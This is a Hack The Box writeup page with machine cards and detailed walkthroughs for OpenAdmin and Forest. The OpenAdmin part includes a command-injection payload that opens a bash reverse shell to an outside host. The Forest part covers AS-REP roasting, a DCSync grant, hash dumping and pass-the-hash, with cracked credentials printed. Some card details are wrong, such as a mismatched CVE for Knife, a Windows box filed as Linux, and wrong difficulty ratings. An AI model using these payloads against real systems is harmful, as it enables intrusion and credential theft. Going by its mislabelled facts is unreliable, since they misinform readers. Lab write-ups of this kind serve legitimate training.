---
layout: page
title: Hack The Box
subtitle: Machine writeups organized by OS, difficulty, and technique
permalink: /ctf/platforms/hackthebox/
platform: HackTheBox
---

<div class="platform-hero htb-hero">
  <div class="plat-hero-icon">⬡</div>
  <div class="plat-hero-text">
    <h2>Hack The Box</h2>
    <p>Standalone machines, Active Directory ProLabs, Sherlocks (DFIR), and competitive challenges.</p>
    <div class="plat-hero-badges">
      <span class="badge badge-success">Rank: Pro Hacker</span>
      <span class="badge badge-info">40+ Machines Owned</span>
      <span class="badge badge-warning">25+ Challenges</span>
    </div>
  </div>
</div>

<div class="machine-filter-bar">
  <button class="mf-btn active" data-filter="all">All</button>
  <button class="mf-btn" data-filter="linux">🐧 Linux</button>
  <button class="mf-btn" data-filter="windows">🪟 Windows</button>
  <button class="mf-btn" data-filter="active-directory">🏢 Active Directory</button>
  <button class="mf-btn" data-filter="easy">Easy</button>
  <button class="mf-btn" data-filter="medium">Medium</button>
  <button class="mf-btn" data-filter="hard">Hard</button>
  <button class="mf-btn" data-filter="insane">Insane</button>
</div>

---

## 🐧 Linux Machines

<div class="machines-list">

  <div class="machine-card" data-os="linux" data-diff="easy">
    <div class="mc-left">
      <span class="mc-os linux">🐧</span>
      <div>
        <h4 class="mc-name">OpenAdmin</h4>
        <span class="mc-ip">10.10.10.171</span>
      </div>
    </div>
    <div class="mc-mid">
      <span class="mc-tech">OpenNetAdmin RCE · SSH key LFI · sudo nano GTFOBin</span>
    </div>
    <div class="mc-right">
      <span class="mc-diff easy">Easy</span>
      <a href="#openadmin" class="mc-btn">Writeup ↓</a>
    </div>
  </div>

  <div class="machine-card" data-os="linux" data-diff="easy">
    <div class="mc-left">
      <span class="mc-os linux">🐧</span>
      <div>
        <h4 class="mc-name">Knife</h4>
        <span class="mc-ip">10.10.10.242</span>
      </div>
    </div>
    <div class="mc-mid">
      <span class="mc-tech">PHP 8.1 backdoor (CVE-2021-3129) · sudo knife GTFOBin</span>
    </div>
    <div class="mc-right">
      <span class="mc-diff easy">Easy</span>
      <a href="#knife" class="mc-btn">Writeup ↓</a>
    </div>
  </div>

  <div class="machine-card" data-os="linux" data-diff="easy">
    <div class="mc-left">
      <span class="mc-os linux">🐧</span>
      <div>
        <h4 class="mc-name">Nibbles</h4>
        <span class="mc-ip">10.10.10.75</span>
      </div>
    </div>
    <div class="mc-mid">
      <span class="mc-tech">NibbleBlog file upload RCE · sudo script wildcard injection</span>
    </div>
    <div class="mc-right">
      <span class="mc-diff easy">Easy</span>
      <a href="#nibbles" class="mc-btn">Writeup ↓</a>
    </div>
  </div>

  <div class="machine-card" data-os="linux" data-diff="medium">
    <div class="mc-left">
      <span class="mc-os linux">🐧</span>
      <div>
        <h4 class="mc-name">BountyHunter</h4>
        <span class="mc-ip">10.10.11.100</span>
      </div>
    </div>
    <div class="mc-mid">
      <span class="mc-tech">XXE → LFI · credential reuse · Python eval() code injection</span>
    </div>
    <div class="mc-right">
      <span class="mc-diff medium">Medium</span>
      <a href="#bountyhunter" class="mc-btn">Writeup ↓</a>
    </div>
  </div>

  <div class="machine-card" data-os="linux" data-diff="medium">
    <div class="mc-left">
      <span class="mc-os linux">🐧</span>
      <div>
        <h4 class="mc-name">Horizontall</h4>
        <span class="mc-ip">10.10.11.105</span>
      </div>
    </div>
    <div class="mc-mid">
      <span class="mc-tech">Strapi CMS RCE (CVE-2019-19609) · Laravel telescopy SSRF → privesc</span>
    </div>
    <div class="mc-right">
      <span class="mc-diff medium">Medium</span>
      <a href="#horizontall" class="mc-btn">Writeup ↓</a>
    </div>
  </div>

  <div class="machine-card" data-os="linux" data-diff="medium">
    <div class="mc-left">
      <span class="mc-os linux">🐧</span>
      <div>
        <h4 class="mc-name">Writer</h4>
        <span class="mc-ip">10.10.11.101</span>
      </div>
    </div>
    <div class="mc-mid">
      <span class="mc-tech">SQLi union-based · SSRF via file upload · APT hooks for root</span>
    </div>
    <div class="mc-right">
      <span class="mc-diff medium">Medium</span>
      <a href="#writer" class="mc-btn">Writeup ↓</a>
    </div>
  </div>

  <div class="machine-card" data-os="linux" data-diff="hard">
    <div class="mc-left">
      <span class="mc-os linux">🐧</span>
      <div>
        <h4 class="mc-name">Scrambled</h4>
        <span class="mc-ip">10.10.11.168</span>
      </div>
    </div>
    <div class="mc-mid">
      <span class="mc-tech">Kerberos-only auth · Silver ticket attack · .NET deserialization RCE</span>
    </div>
    <div class="mc-right">
      <span class="mc-diff hard">Hard</span>
      <a href="#scrambled" class="mc-btn">Writeup ↓</a>
    </div>
  </div>

</div>

---

## 🪟 Windows Machines

<div class="machines-list">

  <div class="machine-card" data-os="windows" data-diff="easy">
    <div class="mc-left">
      <span class="mc-os windows">🪟</span>
      <div>
        <h4 class="mc-name">Blue</h4>
        <span class="mc-ip">10.10.10.40</span>
      </div>
    </div>
    <div class="mc-mid">
      <span class="mc-tech">EternalBlue (MS17-010) · SMBv1 exploitation · SYSTEM shell</span>
    </div>
    <div class="mc-right">
      <span class="mc-diff easy">Easy</span>
      <a href="#blue" class="mc-btn">Writeup ↓</a>
    </div>
  </div>

  <div class="machine-card" data-os="windows" data-diff="easy">
    <div class="mc-left">
      <span class="mc-os windows">🪟</span>
      <div>
        <h4 class="mc-name">Legacy</h4>
        <span class="mc-ip">10.10.10.4</span>
      </div>
    </div>
    <div class="mc-mid">
      <span class="mc-tech">MS08-067 · SMB NetAPI buffer overflow · no auth required</span>
    </div>
    <div class="mc-right">
      <span class="mc-diff easy">Easy</span>
      <a href="#legacy" class="mc-btn">Writeup ↓</a>
    </div>
  </div>

  <div class="machine-card" data-os="windows" data-diff="medium">
    <div class="mc-left">
      <span class="mc-os windows">🪟</span>
      <div>
        <h4 class="mc-name">Resolute</h4>
        <span class="mc-ip">10.10.10.169</span>
      </div>
    </div>
    <div class="mc-mid">
      <span class="mc-tech">RPC null session user enum · password spray · DNSAdmins DLL injection</span>
    </div>
    <div class="mc-right">
      <span class="mc-diff medium">Medium</span>
      <a href="#resolute" class="mc-btn">Writeup ↓</a>
    </div>
  </div>

  <div class="machine-card" data-os="windows" data-diff="medium">
    <div class="mc-left">
      <span class="mc-os windows">🪟</span>
      <div>
        <h4 class="mc-name">Sauna</h4>
        <span class="mc-ip">10.10.10.175</span>
      </div>
    </div>
    <div class="mc-mid">
      <span class="mc-tech">AS-REP Roasting · AutoLogon creds · DCSync via GetChangesAll</span>
    </div>
    <div class="mc-right">
      <span class="mc-diff medium">Medium</span>
      <a href="#sauna" class="mc-btn">Writeup ↓</a>
    </div>
  </div>

  <div class="machine-card" data-os="windows" data-diff="hard">
    <div class="mc-left">
      <span class="mc-os windows">🪟</span>
      <div>
        <h4 class="mc-name">Mantis</h4>
        <span class="mc-ip">10.10.10.52</span>
      </div>
    </div>
    <div class="mc-mid">
      <span class="mc-tech">OrchardCMS MSSQL creds · MS14-068 Kerberos PAC forgery</span>
    </div>
    <div class="mc-right">
      <span class="mc-diff hard">Hard</span>
      <a href="#mantis" class="mc-btn">Writeup ↓</a>
    </div>
  </div>

</div>

---

## 🏢 Active Directory Machines

<div class="machines-list">

  <div class="machine-card" data-os="active-directory" data-diff="hard">
    <div class="mc-left">
      <span class="mc-os ad">🏢</span>
      <div>
        <h4 class="mc-name">Forest</h4>
        <span class="mc-ip">10.10.10.161</span>
      </div>
    </div>
    <div class="mc-mid">
      <span class="mc-tech">AS-REP Roast → BloodHound → WriteDACL → DCSync</span>
    </div>
    <div class="mc-right">
      <span class="mc-diff hard">Hard</span>
      <a href="#forest" class="mc-btn">Writeup ↓</a>
    </div>
  </div>

  <div class="machine-card" data-os="active-directory" data-diff="hard">
    <div class="mc-left">
      <span class="mc-os ad">🏢</span>
      <div>
        <h4 class="mc-name">Active</h4>
        <span class="mc-ip">10.10.10.100</span>
      </div>
    </div>
    <div class="mc-mid">
      <span class="mc-tech">GPP password decryption (cpasswd) → Kerberoasting Administrator</span>
    </div>
    <div class="mc-right">
      <span class="mc-diff hard">Hard</span>
      <a href="#active" class="mc-btn">Writeup ↓</a>
    </div>
  </div>

  <div class="machine-card" data-os="active-directory" data-diff="insane">
    <div class="mc-left">
      <span class="mc-os ad">🏢</span>
      <div>
        <h4 class="mc-name">Offshore ProLab</h4>
        <span class="mc-ip">ProLab</span>
      </div>
    </div>
    <div class="mc-mid">
      <span class="mc-tech">Multi-domain AD forest · ADCS ESC1 · Kerberos delegation chains</span>
    </div>
    <div class="mc-right">
      <span class="mc-diff insane">ProLab</span>
      <a href="#offshore" class="mc-btn">Writeup ↓</a>
    </div>
  </div>

</div>

---

## 🔬 Sherlocks (DFIR)

<div class="machines-list">

  <div class="machine-card" data-os="dfir" data-diff="easy">
    <div class="mc-left">
      <span class="mc-os dfir">🔬</span>
      <div>
        <h4 class="mc-name">Brutus</h4>
        <span class="mc-ip">auth.log · wtmp</span>
      </div>
    </div>
    <div class="mc-mid">
      <span class="mc-tech">SSH brute-force analysis · backdoor user detection from auth.log</span>
    </div>
    <div class="mc-right">
      <span class="mc-diff easy">Easy</span>
      <a href="#brutus" class="mc-btn">Writeup ↓</a>
    </div>
  </div>

  <div class="machine-card" data-os="dfir" data-diff="medium">
    <div class="mc-left">
      <span class="mc-os dfir">🔬</span>
      <div>
        <h4 class="mc-name">Noted</h4>
        <span class="mc-ip">Memory dump</span>
      </div>
    </div>
    <div class="mc-mid">
      <span class="mc-tech">Volatility memory analysis · credential extraction · process timeline</span>
    </div>
    <div class="mc-right">
      <span class="mc-diff medium">Medium</span>
      <a href="#noted" class="mc-btn">Writeup ↓</a>
    </div>
  </div>

</div>

---

## 📝 Detailed Writeups

<div id="openadmin" class="writeup-block">

### OpenAdmin — Linux Easy {#openadmin}

**IP**: `10.10.10.171` | **OS**: Ubuntu 18.04 | **Released**: January 2020

#### Reconnaissance
```bash
nmap -sC -sV -T4 -p- -oN openadmin.nmap 10.10.10.171
# Open: 22/SSH, 80/Apache 2.4.29
gobuster dir -u http://10.10.10.171 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
# Found: /ona/ → OpenNetAdmin v18.1.1
```

#### Initial Foothold — CVE-2019-26057
```bash
curl -s -X POST "http://10.10.10.171/ona/" \
  --data 'xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;bash+-c+"bash+-i+>%26+/dev/tcp/10.10.14.5/4444+0>%261"&xajaxargs[]=ping'
# Received: www-data shell
```

#### Lateral Movement
```bash
cat /opt/ona/www/local/config/database_settings.inc.php
# 'db_passwd' => 'n1nj4W4rri0R!'
su jimmy  # password reused
curl http://127.0.0.1:52846/main.php  # Returns joanna's private key
john --wordlist=rockyou.txt id_rsa.hash  # → bloodninjas
```

#### Privilege Escalation
```bash
sudo -l  # (ALL) NOPASSWD: /bin/nano /opt/priv
sudo /bin/nano /opt/priv
# Ctrl+R → Ctrl+X → reset; sh 1>&0 2>&0
# ROOT
```

</div>

<div id="forest" class="writeup-block">

### Forest — Windows Hard (Active Directory) {#forest}

**IP**: `10.10.10.161` | **OS**: Windows Server 2016 | **Domain**: HTB.LOCAL

#### Enumeration
```bash
rpcclient -U "" -N 10.10.10.161 -c "enumdomusers"
# Users: svc-alfresco, andy, mark, santi, sebastien, lucinda
GetNPUsers.py htb.local/ -usersfile users.txt -dc-ip 10.10.10.161 -no-pass
# Got AS-REP hash for svc-alfresco (no preauthentication required)
hashcat -m 18200 asrep.hash rockyou.txt  # → s3rvice
```

#### BloodHound Attack Path
```
svc-alfresco
  → Account Operators (MemberOf)
    → Exchange Windows Permissions (GenericAll)
      → htb.local (WriteDACL)
        → Grant DCSync rights
```

#### DCSync → Domain Compromise
```bash
Add-DomainObjectAcl -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity svc-alfresco -Rights DCSync
secretsdump.py svc-alfresco:s3rvice@10.10.10.161
# Administrator NTLM: 32693b11e6aa90eb43d32c72a07ceea6
psexec.py -hashes :32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161
# NT AUTHORITY\SYSTEM
```

</div>

<script>
// Machine filter functionality
document.addEventListener('DOMContentLoaded', function() {
  const filterBtns = document.querySelectorAll('.mf-btn');
  const machineCards = document.querySelectorAll('.machine-card');

  filterBtns.forEach(btn => {
    btn.addEventListener('click', function() {
      const filter = this.dataset.filter;
      filterBtns.forEach(b => b.classList.remove('active'));
      this.classList.add('active');

      machineCards.forEach(card => {
        if (filter === 'all') {
          card.style.display = 'flex';
        } else if (card.dataset.os === filter || card.dataset.diff === filter) {
          card.style.display = 'flex';
        } else {
          card.style.display = 'none';
        }
      });
    });
  });
});
</script>
